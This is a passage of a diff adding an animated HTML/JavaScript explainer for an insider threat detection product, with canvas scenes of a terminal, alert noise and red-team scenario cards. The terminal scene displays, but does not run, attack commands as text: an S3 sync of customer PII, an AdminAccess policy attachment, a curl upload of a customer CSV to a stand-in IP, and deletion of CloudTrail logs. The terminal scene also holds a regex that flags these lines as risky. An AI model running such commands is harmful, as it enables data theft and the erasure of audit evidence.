@@ -1,0 +1,1333 @@
+
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&family=Amiri:wght@400;700&display=swap');
+  * { margin:0; padding:0; box-sizing:border-box; }
+  #rasd-v3 {
+    background:#000; width:100%; aspect-ratio:16/9; position:relative; overflow:hidden;
+    font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;
+    user-select:none; border-radius:8px;
+  }
+  #rasd-v3 canvas { position:absolute; inset:0; width:100%; height:100%; image-rendering:auto; }
+  #rasd-v3 .layer { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; pointer-events:none; }
+  #rasd-v3 .text { color:#fff; text-align:center; padding:0 7%; opacity:0; transform:translateY(8px); transition:opacity 0.7s cubic-bezier(.2,.7,.3,1), transform 0.7s cubic-bezier(.2,.7,.3,1); will-change:opacity,transform; }
+  #rasd-v3 .text.show { opacity:1; transform:translateY(0); }
+  #rasd-v3 .kicker { font-size:clamp(8px,1.4vw,13px); font-weight:500; color:#00d4ff; letter-spacing:0.4em; text-transform:uppercase; margin-bottom:1.4em; }
+  #rasd-v3 .headline { font-size:clamp(16px,3.4vw,38px); font-weight:200; color:#fff; line-height:1.15; letter-spacing:-0.02em; }
+  #rasd-v3 .headline b { font-weight:700; color:#00d4ff; }
+  #rasd-v3 .headline em { font-style:normal; color:#ff3b3b; font-weight:700; }
+  #rasd-v3 .sub { font-size:clamp(10px,1.7vw,17px); color:#7c8a98; margin-top:1.1em; font-weight:300; letter-spacing:0.02em; }
+  #rasd-v3 #progress { position:absolute; bottom:0; left:0; height:2px; background:linear-gradient(90deg,#00d4ff,#00f0ff); transition:width 0.08s linear; box-shadow:0 0 12px #00d4ff; width:0%; z-index:30; }
+  #rasd-v3 #chapters { position:absolute; top:14px; left:50%; transform:translateX(-50%); display:flex; gap:24px; z-index:30; }
+  #rasd-v3 .ch { display:flex; align-items:center; gap:6px; font-size:9px; color:#3a4a55; letter-spacing:0.2em; text-transform:uppercase; font-weight:500; transition:color 0.6s; }
+  #rasd-v3 .ch.active { color:#00d4ff; }
+  #rasd-v3 .ch .num { font-family:monospace; opacity:0.7; }
+  #rasd-v3 #brand { position:absolute; top:14px; left:18px; z-index:30; display:flex; align-items:center; gap:8px; font-size:11px; color:#5a6a78; letter-spacing:0.2em; font-weight:500; }
+  #rasd-v3 #brand .dot { width:6px; height:6px; border-radius:50%; background:#00d4ff; box-shadow:0 0 8px #00d4ff; animation:pulse 1.6s ease-in-out infinite; }
+  #rasd-v3 #timecode { position:absolute; top:14px; right:18px; z-index:30; font-family:'JetBrains Mono',monospace; font-size:10px; color:#3a4a55; letter-spacing:0.1em; }
+  @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
+  #rasd-v3 #play-screen {
+    position:absolute; inset:0; display:flex; flex-direction:column; align-items:center; justify-content:center;
+    background:radial-gradient(circle at center, #001428 0%, #000 70%); z-index:40; cursor:pointer; gap:18px;
+    transition:opacity 0.6s ease;
+  }
+  #rasd-v3 #play-screen.fade { opacity:0; pointer-events:none; }
+  #rasd-v3 #play-screen .logo-mark {
+    font-family:'Amiri',serif; font-size:clamp(28px,5vw,52px); color:#00d4ff; direction:rtl; letter-spacing:0.05em;
+    text-shadow:0 0 30px rgba(0,212,255,0.6);
+  }
+  #rasd-v3 #play-screen .play-circle {
+    width:64px; height:64px; border-radius:50%; border:1.5px solid rgba(0,212,255,0.7);
+    display:flex; align-items:center; justify-content:center; transition:transform 0.3s, box-shadow 0.3s;
+    box-shadow:0 0 24px rgba(0,212,255,0.2);
+  }
+  #rasd-v3 #play-screen:hover .play-circle { transform:scale(1.1); box-shadow:0 0 40px rgba(0,212,255,0.5); }
+  #rasd-v3 #play-screen .play-circle svg { width:22px; height:22px; margin-left:4px; }
+  #rasd-v3 #play-screen .label { font-size:11px; color:#5a6a78; letter-spacing:0.3em; text-transform:uppercase; }
+  #rasd-v3 #play-screen .meta { font-size:9px; color:#3a4a55; letter-spacing:0.2em; font-family:monospace; margin-top:4px; }
+  #rasd-v3 #replay-btn { position:absolute; bottom:18px; right:18px; z-index:35; padding:6px 14px; background:rgba(0,212,255,0.1); border:1px solid rgba(0,212,255,0.3); color:#00d4ff; font-size:10px; letter-spacing:0.2em; text-transform:uppercase; cursor:pointer; opacity:0; transition:opacity 0.4s; pointer-events:none; border-radius:4px; font-family:inherit; }
+  #rasd-v3 #replay-btn.show { opacity:1; pointer-events:auto; }
+  #rasd-v3 #replay-btn:hover { background:rgba(0,212,255,0.2); }
+  #rasd-v3 #scene-fade { position:absolute; inset:0; background:#000; pointer-events:none; z-index:20; opacity:0; transition:opacity 0.45s ease; }
+  #rasd-v3 #scene-fade.show { opacity:1; }
+</style>
+
+<div id="rasd-v3">
+  <canvas id="bg"></canvas>
+  <div id="scene-fade"></div>
+  <div class="layer"><div class="text" id="overlay-text"></div></div>
+
+  <div id="brand"><span class="dot"></span><span>RASD · INSIDER THREAT DETECTION</span></div>
+  <div id="timecode">00:00 / 00:52</div>
+  <div id="chapters">
+    <div class="ch active" data-ch="0"><span class="num">01</span><span>Threat</span></div>
+    <div class="ch" data-ch="1"><span class="num">02</span><span>Noise</span></div>
+    <div class="ch" data-ch="2"><span class="num">03</span><span>Scenarios</span></div>
+    <div class="ch" data-ch="3"><span class="num">04</span><span>Detect</span></div>
+    <div class="ch" data-ch="4"><span class="num">05</span><span>Numbers</span></div>
+    <div class="ch" data-ch="5"><span class="num">06</span><span>Reveal</span></div>
+  </div>
+
+  <div id="progress"></div>
+
+  <div id="play-screen">
+    <div class="logo-mark">رصد</div>
+    <div class="play-circle">
+      <svg viewBox="0 0 24 24" fill="none"><polygon points="6,4 20,12 6,20" fill="#00d4ff"/></svg>
+    </div>
+    <div class="label">Watch the explainer</div>
+    <div class="meta">52s · F1 0.927 · 3ms p95 · 100% red-team detection</div>
+  </div>
+
+  <button id="replay-btn">↻ Replay</button>
+</div>
+
+<script>
+(function(){
+  const root = document.getElementById('rasd-v3');
+  const bg = document.getElementById('bg'), bctx = bg.getContext('2d');
+  const overlay = document.getElementById('overlay-text');
+  const progress = document.getElementById('progress');
+  const timecode = document.getElementById('timecode');
+  const playScreen = document.getElementById('play-screen');
+  const replayBtn = document.getElementById('replay-btn');
+  const sceneFade = document.getElementById('scene-fade');
+  const chapterEls = root.querySelectorAll('.ch');
+
+  let W=0,H=0, dpr=Math.min(window.devicePixelRatio||1, 2);
+  let running=false, startTime=0, rafId=null, lastScene=-1;
+
+  // ===== easing helpers =====
+  const easeOutCubic = t => 1 - Math.pow(1-t, 3);
+  const easeInOutCubic = t => t < 0.5 ? 4*t*t*t : 1 - Math.pow(-2*t+2, 3)/2;
+  const easeOutQuart = t => 1 - Math.pow(1-t, 4);
+  const smoothstep = t => t*t*(3-2*t);
+
+  // Total: 52s
+  const DUR = 52;
+  const scenes = [
+    {id:0, start:0,    end:7,    name:'threat'},
+    {id:1, start:7,    end:13,   name:'noise'},
+    {id:2, start:13,   end:24,   name:'scenarios'},
+    {id:3, start:24,   end:33,   name:'detect'},
+    {id:4, start:33,   end:44,   name:'numbers'},
+    {id:5, start:44,   end:52,   name:'reveal'}
+  ];
+
+  function resize(){
+    const r = root.getBoundingClientRect();
+    W = r.width; H = r.height;
+    bg.width = W*dpr; bg.height = H*dpr;
+    bctx.setTransform(dpr,0,0,dpr,0,0);
+  }
+
+  // ===== persistent state across frames =====
+  const state = {
+    particles: [],
+    alerts: [],
+    mapNodes: [],
+    wavePhase: 0,
+    s1_cursor: 0,
+    scenarioCards: [],
+    statCards: []
+  };
+
+  function initParticles(n){
+    state.particles = [];
+    for(let i=0;i<n;i++) state.particles.push({
+      x:Math.random()*W, y:Math.random()*H,
+      vx:(Math.random()-0.5)*0.15, vy:(Math.random()-0.5)*0.15,
+      r:Math.random()*1.2+0.2, a:Math.random()*0.5+0.1
+    });
+  }
+
+  function drawParticles(intensity){
+    state.particles.forEach(p=>{
+      p.x += p.vx; p.y += p.vy;
+      if(p.x<0)p.x=W; if(p.x>W)p.x=0;
+      if(p.y<0)p.y=H; if(p.y>H)p.y=0;
+      bctx.fillStyle = `rgba(0, 212, 255, ${p.a*intensity})`;
+      bctx.beginPath();
+      bctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
+      bctx.fill();
+    });
+  }
+
+  // ===== scene transition: gentle dip-to-black on boundaries =====
+  function sceneIntroFade(sceneT){
+    // Fade in over first 0.6s
+    if(sceneT < 0.6) return 1 - sceneT/0.6;
+    return 0;
+  }
+  function sceneOutroFade(sceneT, sceneDur){
+    // Fade out over last 0.5s
+    const remaining = sceneDur - sceneT;
+    if(remaining < 0.5) return 1 - remaining/0.5;
+    return 0;
+  }
+  function applyBoundaryFade(sceneT, sceneDur){
+    const a = Math.max(sceneIntroFade(sceneT), sceneOutroFade(sceneT, sceneDur));
+    if(a > 0){
+      bctx.fillStyle = `rgba(0,0,0,${a*0.85})`;
+      bctx.fillRect(0,0,W,H);
+    }
+  }
+
+  // ===== utility: draw corner brackets =====
+  function drawCorner(ctx, x, y, size, color, corner){
+    ctx.strokeStyle = color;
+    ctx.lineWidth = 1.5;
+    ctx.beginPath();
+    if(!corner || corner==='tl'){ ctx.moveTo(x, y+size); ctx.lineTo(x, y); ctx.lineTo(x+size, y); }
+    else if(corner==='tr'){ ctx.moveTo(x-size, y); ctx.lineTo(x, y); ctx.lineTo(x, y+size); }
+    else if(corner==='bl'){ ctx.moveTo(x, y-size); ctx.lineTo(x, y); ctx.lineTo(x+size, y); }
+    else if(corner==='br'){ ctx.moveTo(x-size, y); ctx.lineTo(x, y); ctx.lineTo(x, y-size); }
+    ctx.stroke();
+  }
+
+  // ====== SCENE 1: THE THREAT — typing terminal ======
+  const s1_lines = [
+    'ssh admin@prod-db-01.internal',
+    'sudo aws s3 sync s3://customer-pii ./local',
+    'aws iam attach-role-policy --role-name dev \\',
+    '  --policy-arn arn:aws:iam::aws:policy/AdminAccess',
+    'aws sts assume-role --role-arn admin-role',
+    'curl -X POST https://203.0.113.77/exfil \\',
+    '  --data-binary @customers_2026.csv',
+    'aws iam create-access-key --user-name svc-acct',
+    'rm -rf ~/.aws/cloudtrail-logs/'
+  ];
+
+  function drawScene0(t, sceneT, sceneDur){
+    bctx.fillStyle = '#000308';
+    bctx.fillRect(0,0,W,H);
+
+    // Window light
+    const lampX = W*0.78, lampY = H*0.15;
+    const g = bctx.createRadialGradient(lampX, lampY, 0, lampX, lampY, H*1.2);
+    g.addColorStop(0, 'rgba(80, 130, 180, 0.18)');
+    g.addColorStop(0.3, 'rgba(40, 80, 120, 0.08)');
+    g.addColorStop(1, 'rgba(0,0,0,0)');
+    bctx.fillStyle = g;
+    bctx.fillRect(0,0,W,H);
+
+    // Desk
+    const deskY = H*0.78;
+    bctx.fillStyle = '#000206';
+    bctx.fillRect(0, deskY, W, H-deskY);
+
+    // Slow camera push-in: scale subtly
+    const push = 1 + smoothstep(Math.min(1, sceneT/sceneDur)) * 0.04;
+    bctx.save();
+    bctx.translate(W/2, H/2);
+    bctx.scale(push, push);
+    bctx.translate(-W/2, -H/2);
+
+    // Laptop screen
+    const sx = W*0.32, sy = H*0.27, sw = W*0.4, sh = H*0.44;
+    bctx.fillStyle = '#0a0e14';
+    bctx.fillRect(sx-6, sy-6, sw+12, sh+12);
+    const screenGlow = bctx.createLinearGradient(sx, sy, sx, sy+sh);
+    screenGlow.addColorStop(0, '#001220');
+    screenGlow.addColorStop(1, '#000810');
+    bctx.fillStyle = screenGlow;
+    bctx.fillRect(sx, sy, sw, sh);
+
+    // Header
+    bctx.fillStyle = '#0a1a26';
+    bctx.fillRect(sx, sy, sw, 18);
+    ['#ff5f57','#febc2e','#28c840'].forEach((c,i)=>{
+      bctx.fillStyle = c;
+      bctx.beginPath(); bctx.arc(sx+10+i*14, sy+9, 4, 0, Math.PI*2); bctx.fill();
+    });
+    bctx.fillStyle = 'rgba(120,150,170,0.5)';
+    bctx.font = `${Math.max(9, H*0.014)}px 'JetBrains Mono',monospace`;
+    bctx.textAlign='center';
+    bctx.fillText('user@workstation — bash — 142x32', sx+sw/2, sy+13);
+
+    // Typewriter with smooth easing
+    const startTyping = 0.5;
+    if(sceneT > startTyping){
+      state.s1_cursor += 0.08;
+      const elapsed = sceneT - startTyping;
+      // Smoother typing rate — ease in, faster mid, slow at end
+      const typeProgress = Math.min(1, elapsed / 5.0);
+      const eased = easeInOutCubic(typeProgress);
+      const totalCharsTarget = s1_lines.reduce((a,l)=>a+l.length,0);
+      const totalChars = Math.floor(eased * totalCharsTarget);
+      let consumed = 0;
+      const shown = [];
+      for(let i=0;i<s1_lines.length;i++){
+        const line = s1_lines[i];
+        if(consumed + line.length <= totalChars){
+          shown.push(line);
+          consumed += line.length;
+        } else if(consumed < totalChars){
+          shown.push(line.substring(0, totalChars - consumed));
+          break;
+        } else break;
+      }
+      bctx.textAlign='left';
+      bctx.font = `${Math.max(10, H*0.018)}px 'JetBrains Mono',monospace`;
+      const lh = Math.max(14, H*0.026);
+      shown.forEach((line, i) => {
+        const ly = sy + 38 + i*lh;
+        if(ly > sy + sh - 10) return;
+        const isRisky = /sudo|s3 sync|create-access-key|AdminAccess|rm -rf|exfil|attach-role-policy/.test(line);
+        bctx.fillStyle = 'rgba(120, 200, 220, 0.5)';
+        bctx.fillText('$ ', sx+12, ly);
+        bctx.fillStyle = isRisky ? 'rgba(255, 90, 90, 0.88)' : 'rgba(180, 230, 240, 0.78)';
+        bctx.fillText(line, sx+28, ly);
+      });
+      if(shown.length){
+        const lastIdx = shown.length-1;
+        const lastLine = shown[lastIdx];
+        const cursorX = sx + 28 + bctx.measureText(lastLine).width + 2;
+        const cursorY = sy + 38 + lastIdx*lh;
+        if(Math.floor(state.s1_cursor*2) % 2 === 0 && cursorY < sy + sh - 10){
+          bctx.fillStyle = 'rgba(0, 212, 255, 0.9)';
+          bctx.fillRect(cursorX, cursorY - 11, 8, 13);
+        }
+      }
+    }
+
+    // Soft scan line
+    const scan = (sceneT * 0.35) % 1;
+    bctx.fillStyle = 'rgba(0, 212, 255, 0.03)';
+    bctx.fillRect(sx, sy + scan*sh, sw, 3);
+
+    bctx.restore();
+
+    drawParticles(0.3);
+
+    // Vignette
+    const vg = bctx.createRadialGradient(W/2, H/2, H*0.15, W/2, H/2, H*0.8);
+    vg.addColorStop(0, 'rgba(0,0,0,0)');
+    vg.addColorStop(1, 'rgba(0,0,0,0.85)');
+    bctx.fillStyle = vg;
+    bctx.fillRect(0,0,W,H);
+
+    // Smooth text show/hide window
+    if(sceneT > 3.8 && sceneT < 6.4){
+      showText(`
+        <div class="kicker">The reality</div>
+        <div class="headline">It takes <em>197 days</em><br>to detect an insider breach.</div>
+        <div class="sub">By then, the data is gone.</div>
+      `);
+    } else {
+      hideText();
+    }
+
+    applyBoundaryFade(sceneT, sceneDur);
+  }
+
+  // ====== SCENE 2: THE NOISE — alert flood ======
+  function initAlerts(){
+    state.alerts = [];
+    const types = ['ALERT','WARN','CRIT','INFO','ALERT','WARN','ALERT'];
+    const msgs = [
+      'Failed login: 192.168.1.45','Unusual S3 access pattern','High API call volume',
+      'New IP detected','Failed MFA: usr_4471','Resource enumeration','Off-hours activity',
+      'Anomalous data transfer','IAM policy modified','Privileged action: AssumeRole',
+      'GetObject burst', 'DescribeInstances spike','ListUsers query', 'KMS decrypt failure',
+      'CloudTrail StopLogging'
+    ];
+    for(let i=0;i<70;i++){
+      state.alerts.push({
+        x:Math.random()*W*1.4 - W*0.2,
+        y:Math.random()*H*1.4 - H*0.2,
+        w:90+Math.random()*120,
+        h:22+Math.random()*8,
+        type:types[Math.floor(Math.random()*types.length)],
+        msg:msgs[Math.floor(Math.random()*msgs.length)],
+        spawn:i*0.045,
+        seed:Math.random()*100
+      });
+    }
+  }
+
+  function drawScene1(t, sceneT, sceneDur){
+    bctx.fillStyle = '#020005';
+    bctx.fillRect(0,0,W,H);
+
+    // Scrolling grid
+    bctx.strokeStyle = 'rgba(20, 40, 60, 0.4)';
+    bctx.lineWidth = 0.5;
+    const gridSize = 40;
+    const offset = (sceneT * 30) % gridSize;
+    for(let x=-offset; x<W; x+=gridSize){
+      bctx.beginPath(); bctx.moveTo(x,0); bctx.lineTo(x,H); bctx.stroke();
+    }
+    for(let y=-offset; y<H; y+=gridSize){
+      bctx.beginPath(); bctx.moveTo(0,y); bctx.lineTo(W,y); bctx.stroke();
+    }
+
+    state.alerts.forEach(a => {
+      if(sceneT >= a.spawn){
+        const life = sceneT - a.spawn;
+        const fade = easeOutCubic(Math.min(1, life*2.5));
+        const alpha = fade * (a.type==='CRIT'?0.9:a.type==='ALERT'?0.7:0.4);
+        const color = a.type==='CRIT'?'255,40,40':a.type==='ALERT'?'255,140,40':a.type==='WARN'?'255,200,60':'80,160,200';
+        bctx.fillStyle = `rgba(${color},${alpha*0.12})`;
+        bctx.fillRect(a.x, a.y, a.w, a.h);
+        bctx.strokeStyle = `rgba(${color},${alpha*0.7})`;
+        bctx.lineWidth = 1;
+        bctx.strokeRect(a.x, a.y, a.w, a.h);
+        const blink = (Math.sin(life*8 + a.seed) + 1) / 2;
+        bctx.fillStyle = `rgba(${color},${alpha*blink})`;
+        bctx.beginPath(); bctx.arc(a.x+8, a.y+a.h/2, 3, 0, Math.PI*2); bctx.fill();
+        bctx.fillStyle = `rgba(${color},${alpha})`;
+        bctx.font = `700 ${Math.max(8, H*0.013)}px 'Inter',sans-serif`;
+        bctx.textAlign='left';
+        bctx.fillText(a.type, a.x+18, a.y+a.h/2+3);
+        bctx.fillStyle = `rgba(${color},${alpha*0.7})`;
+        bctx.font = `400 ${Math.max(7, H*0.011)}px 'Inter',sans-serif`;
+        bctx.fillText(a.msg, a.x+50, a.y+a.h/2+3);
+      }
+    });
+
+    // Red intensifying overlay
+    const intensity = smoothstep(Math.max(0, Math.min(1, (sceneT-2.5)/2.5)));
+    bctx.fillStyle = `rgba(80, 0, 0, ${intensity*0.18})`;
+    bctx.fillRect(0,0,W,H);
+
+    const vg = bctx.createRadialGradient(W/2, H/2, H*0.1, W/2, H/2, H*0.7);
+    vg.addColorStop(0, 'rgba(0,0,0,0)');
+    vg.addColorStop(1, 'rgba(0,0,0,0.75)');
+    bctx.fillStyle = vg;
+    bctx.fillRect(0,0,W,H);
+
+    if(sceneT > 1.3 && sceneT < 5.4){
+      showText(`
+        <div class="kicker">The old way fails</div>
+        <div class="headline">Thousands of alerts.<br><em>Real threats slip through.</em></div>
+        <div class="sub">Analysts can't keep up. Neither can perimeter rules.</div>
+      `);
+    } else { hideText(); }
+
+    applyBoundaryFade(sceneT, sceneDur);
+  }
+
+  // ====== SCENE 3: SCENARIOS — 4 red team attacks ======
+  // Each scenario from your paper: TC-06 through TC-09
+  const scenarios = [
+    {
+      icon: 'exfil',
+      title: 'DATA EXFILTRATION',
+      detail: '10 × GetObject · sensitive S3 · 02:00 UTC',
+      ip: '203.0.113.77',
+      score: 60,
+      tier: 'HIGH',
+      enforce: 'MFA + 3600s rollback',
+      multipliers: ['afterHours ×1.2']
+    },
+    {
+      icon: 'priv',
+      title: 'PRIVILEGE ESCALATION',
+      detail: 'CreateRole · AttachPolicy · PassRole',
+      ip: 'internal-admin',
+      score: 100,
+      tier: 'CRITICAL',
+      enforce: 'Deny all · revoke sessions',
+      multipliers: ['highRisk ×1.3', 'afterHours ×1.2', 'critical ×1.5']
+    },
+    {
+      icon: 'lateral',
+      title: 'LATERAL MOVEMENT',
+      detail: 'EC2 · S3 · Lambda · DynamoDB · IAM',
+      ip: 'rotating',
+      score: 78,
+      tier: 'HIGH',
+      enforce: 'MFA + 3600s rollback',
+      multipliers: ['afterHours ×1.2', 'highSensitivity ×1.3']
+    },
+    {
+      icon: 'cred',
+      title: 'CREDENTIAL COMPROMISE',
+      detail: '5 failed logins → successful access',
+      ip: '198.51.100.42',
+      score: 60,
+      tier: 'HIGH',
+      enforce: 'MFA + 3600s rollback',
+      multipliers: ['afterHours ×1.2', 'failedAuth ×1.3']
+    }
+  ];
+
+  function drawScenarioIcon(ctx, x, y, size, type, color){
+    ctx.strokeStyle = color;
+    ctx.fillStyle = color;
+    ctx.lineWidth = 1.5;
+    const s = size;
+    ctx.save();
+    ctx.translate(x, y);
+    if(type === 'exfil'){
+      // database -> arrow out
+      ctx.beginPath();
+      ctx.ellipse(0, -s*0.5, s*0.5, s*0.2, 0, 0, Math.PI*2);
+      ctx.stroke();
+      ctx.beginPath();
+      ctx.moveTo(-s*0.5, -s*0.5);
+      ctx.lineTo(-s*0.5, s*0.2);
+      ctx.bezierCurveTo(-s*0.5, s*0.4, s*0.5, s*0.4, s*0.5, s*0.2);
+      ctx.lineTo(s*0.5, -s*0.5);
+      ctx.stroke();
+      // arrow
+      ctx.beginPath();
+      ctx.moveTo(s*0.2, s*0.6); ctx.lineTo(s*0.8, s*0.6);
+      ctx.moveTo(s*0.6, s*0.4); ctx.lineTo(s*0.8, s*0.6); ctx.lineTo(s*0.6, s*0.8);
+      ctx.stroke();
+    } else if(type === 'priv'){
+      // user up arrow / crown
+      ctx.beginPath();
+      ctx.arc(0, -s*0.2, s*0.3, 0, Math.PI*2);
+      ctx.stroke();
+      ctx.beginPath();
+      ctx.moveTo(-s*0.5, s*0.7);
+      ctx.bezierCurveTo(-s*0.5, s*0.2, s*0.5, s*0.2, s*0.5, s*0.7);
+      ctx.stroke();
+      // up arrow
+      ctx.beginPath();
+      ctx.moveTo(0, -s*0.85); ctx.lineTo(0, -s*0.55);
+      ctx.moveTo(-s*0.15, -s*0.7); ctx.lineTo(0, -s*0.85); ctx.lineTo(s*0.15, -s*0.7);
+      ctx.stroke();
+    } else if(type === 'lateral'){
+      // network of nodes
+      const pts = [[-s*0.6,0],[0,-s*0.5],[s*0.6,0],[0,s*0.5]];
+      pts.forEach((p,i)=>{
+        for(let j=i+1;j<pts.length;j++){
+          ctx.beginPath();
+          ctx.moveTo(p[0], p[1]);
+          ctx.lineTo(pts[j][0], pts[j][1]);
+          ctx.stroke();
+        }
+      });
+      pts.forEach(p=>{
+        ctx.beginPath();
+        ctx.arc(p[0], p[1], s*0.12, 0, Math.PI*2);
+        ctx.fill();
+      });
+    } else if(type === 'cred'){
+      // key
+      ctx.beginPath();
+      ctx.arc(-s*0.3, 0, s*0.3, 0, Math.PI*2);
+      ctx.stroke();
+      ctx.beginPath();
+      ctx.moveTo(0, 0); ctx.lineTo(s*0.7, 0);
+      ctx.moveTo(s*0.5, 0); ctx.lineTo(s*0.5, s*0.25);
+      ctx.moveTo(s*0.7, 0); ctx.lineTo(s*0.7, s*0.3);
+      ctx.stroke();
+      // X mark indicating compromise
+      ctx.strokeStyle = '#ff5050';
+      ctx.beginPath();
+      ctx.moveTo(s*0.2, -s*0.6); ctx.lineTo(s*0.5, -s*0.3);
+      ctx.moveTo(s*0.5, -s*0.6); ctx.lineTo(s*0.2, -s*0.3);
+      ctx.stroke();
+    }
+    ctx.restore();
+  }
+
+  function drawScene2(t, sceneT, sceneDur){
+    // Dark blue radial bg
+    bctx.fillStyle = '#000610';
+    bctx.fillRect(0,0,W,H);
+    const bgg = bctx.createRadialGradient(W/2, H/2, 0, W/2, H/2, W*0.7);
+    bgg.addColorStop(0, 'rgba(0, 30, 50, 0.3)');
+    bgg.addColorStop(1, 'rgba(0, 0, 0, 0)');
+    bctx.fillStyle = bgg;
+    bctx.fillRect(0,0,W,H);
+
+    // Subtle moving grid
+    bctx.strokeStyle = 'rgba(0, 60, 90, 0.12)';
+    bctx.lineWidth = 0.5;
+    const gridSize = 50;
+    const offset = (sceneT * 6) % gridSize;
+    for(let y=-offset; y<H; y+=gridSize){
+      bctx.beginPath(); bctx.moveTo(0,y); bctx.lineTo(W,y); bctx.stroke();
+    }
+    for(let x=-offset; x<W; x+=gridSize){
+      bctx.beginPath(); bctx.moveTo(x,0); bctx.lineTo(x,H); bctx.stroke();
+    }
+
+    // Heading
+    if(sceneT > 0.3){
+      const headFade = easeOutCubic(Math.min(1, (sceneT-0.3)/0.7));
+      bctx.globalAlpha = headFade;
+      bctx.fillStyle = '#00d4ff';
+      bctx.font = `500 ${Math.max(10, H*0.016)}px 'Inter',sans-serif`;
+      bctx.textAlign='center';
+      bctx.fillText('R E D   T E A M   ·   F O U R   S C E N A R I O S', W/2, H*0.13);
+      bctx.fillStyle = '#fff';
+      bctx.font = `200 ${Math.max(20, H*0.045)}px 'Inter',sans-serif`;
+      bctx.fillText('All detected. None missed.', W/2, H*0.22);
+      bctx.globalAlpha = 1;
+    }
+
+    // Four scenario cards in 2x2 or 1x4 grid
+    const isWide = W > 700;
+    const cols = isWide ? 4 : 2;
+    const rows = isWide ? 1 : 2;
+    const cardW = W * (isWide ? 0.21 : 0.42);
+    const cardH = H * (isWide ? 0.55 : 0.32);
+    const gapX = W * 0.015;
+    const gapY = H * 0.04;
+    const totalW = cols*cardW + (cols-1)*gapX;
+    const startX = (W - totalW)/2;
+    const startY = H * (isWide ? 0.28 : 0.28);
+
+    scenarios.forEach((sc, i) => {
+      const col = i % cols, row = Math.floor(i/cols);
+      const cx = startX + col*(cardW+gapX);
+      const cy = startY + row*(cardH+gapY);
+      // Smoother stagger
+      const delay = 0.9 + i*0.45;
+      if(sceneT < delay) return;
+      const ts = sceneT - delay;
+      const enter = easeOutCubic(Math.min(1, ts/0.7));
+      const detectTime = 1.8; // when DETECTED stamp appears
+
+      bctx.save();
+      bctx.globalAlpha = enter;
+      // subtle rise
+      const riseY = (1-enter)*16;
+      bctx.translate(0, riseY);
+
+      // Card bg
+      bctx.fillStyle = 'rgba(0, 16, 28, 0.88)';
+      bctx.fillRect(cx, cy, cardW, cardH);
+      bctx.strokeStyle = 'rgba(0, 212, 255, 0.35)';
+      bctx.lineWidth = 1;
+      bctx.strokeRect(cx, cy, cardW, cardH);
+      drawCorner(bctx, cx, cy, 10, '#00d4ff');
+      drawCorner(bctx, cx+cardW, cy, 10, '#00d4ff', 'tr');
+      drawCorner(bctx, cx, cy+cardH, 10, '#00d4ff', 'bl');
+      drawCorner(bctx, cx+cardW, cy+cardH, 10, '#00d4ff', 'br');
+
+      // Index
+      bctx.fillStyle = 'rgba(0, 212, 255, 0.4)';
+      bctx.font = `300 ${Math.max(9, H*0.014)}px 'JetBrains Mono',monospace`;
+      bctx.textAlign='left';
+      bctx.fillText(`0${i+1}`, cx+12, cy+18);
+
+      // Icon
+      const iconColor = sc.tier === 'CRITICAL' ? '#ff5050' : '#ffaa50';
+      drawScenarioIcon(bctx, cx+cardW/2, cy+cardH*0.28, Math.min(cardW, cardH)*0.18, sc.icon, iconColor);
+
+      // Title
+      bctx.fillStyle = '#fff';
+      bctx.font = `700 ${Math.max(10, H*0.016)}px 'Inter',sans-serif`;
+      bctx.textAlign='center';
+      bctx.fillText(sc.title, cx+cardW/2, cy+cardH*0.5);
+
+      // Detail
+      bctx.fillStyle = 'rgba(120, 170, 190, 0.75)';
+      bctx.font = `400 ${Math.max(8, H*0.0115)}px 'JetBrains Mono',monospace`;
+      const detailLines = wrapText(bctx, sc.detail, cardW - 24);
+      detailLines.slice(0,2).forEach((ln, k) => {
+        bctx.fillText(ln, cx+cardW/2, cy+cardH*0.58 + k*12);
+      });
+
+      // Score bar
+      if(ts > 0.6){
+        const scoreEnter = easeOutCubic(Math.min(1, (ts-0.6)/0.6));
+        const barY = cy + cardH*0.74;
+        const barX = cx + 16, barW = cardW - 32;
+        bctx.fillStyle = 'rgba(0, 60, 80, 0.6)';
+        bctx.fillRect(barX, barY, barW, 4);
+        const tierColor = sc.tier === 'CRITICAL' ? '#ff3b3b' : '#ffa033';
+        bctx.fillStyle = tierColor;
+        bctx.fillRect(barX, barY, barW*(sc.score/100)*scoreEnter, 4);
+
+        // Score number
+        bctx.fillStyle = tierColor;
+        bctx.font = `800 ${Math.max(13, H*0.024)}px 'Inter',sans-serif`;
+        bctx.textAlign='left';
+        const displayScore = Math.floor(sc.score * scoreEnter);
+        bctx.fillText(displayScore.toString(), cx+16, cy+cardH*0.7);
+        bctx.fillStyle = 'rgba(150, 180, 200, 0.5)';
+        bctx.font = `500 ${Math.max(8, H*0.012)}px 'JetBrains Mono',monospace`;
+        bctx.fillText('/100', cx+16 + (displayScore>=100 ? 30 : displayScore>=10 ? 22 : 13), cy+cardH*0.7);
+
+        // Tier
+        bctx.fillStyle = tierColor;
+        bctx.font = `700 ${Math.max(9, H*0.013)}px 'Inter',sans-serif`;
+        bctx.textAlign='right';
+        bctx.fillText(sc.tier, cx+cardW-16, cy+cardH*0.7);
+      }
+
+      // DETECTED stamp
+      if(ts > detectTime){
+        const stampEnter = easeOutCubic(Math.min(1, (ts-detectTime)/0.4));
+        bctx.globalAlpha = enter * stampEnter;
+        const stampY = cy + cardH*0.88;
+        bctx.fillStyle = sc.tier === 'CRITICAL' ? 'rgba(255, 59, 59, 0.15)' : 'rgba(0, 212, 255, 0.12)';
+        bctx.fillRect(cx+12, stampY-9, cardW-24, 18);
+        bctx.strokeStyle = sc.tier === 'CRITICAL' ? 'rgba(255, 59, 59, 0.6)' : 'rgba(0, 212, 255, 0.5)';
+        bctx.lineWidth = 0.8;
+        bctx.strokeRect(cx+12, stampY-9, cardW-24, 18);
+        bctx.fillStyle = sc.tier === 'CRITICAL' ? '#ff5050' : '#00d4ff';
+        bctx.font = `700 ${Math.max(8, H*0.012)}px 'Inter',sans-serif`;
+        bctx.textAlign='center';
+        bctx.fillText('✓ DETECTED', cx+cardW/2, stampY+3);
+        bctx.globalAlpha = enter;
+      }
+
+      bctx.restore();
+    });
+
+    // Bottom summary
+    const summaryStart = 7.0;
+    if(sceneT > summaryStart){
